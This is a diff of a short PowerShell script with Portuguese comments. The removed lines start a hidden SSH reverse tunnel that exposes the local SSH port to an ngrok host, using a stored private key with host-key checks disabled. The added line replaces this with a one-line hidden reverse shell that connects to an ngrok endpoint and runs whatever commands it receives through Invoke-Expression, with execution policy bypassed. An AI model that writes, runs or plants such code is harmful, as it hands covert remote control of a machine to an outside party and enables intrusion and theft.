@@ -1,12 +1,1 @@
-# Caminho do SSH
-$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
-
-# Caminho da chave privada
-$keyPath = "C:\Users\Admin\.ssh\ssh_key"
-
-# Argumentos da conexão SSH
-$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 3333:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 13793 -N -vvv"
-
-# Executa o SSH de forma invisível
-Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
-
+powershell -W hidden -nop -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('0.tcp.sa.ngrok.io', 16161);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"     
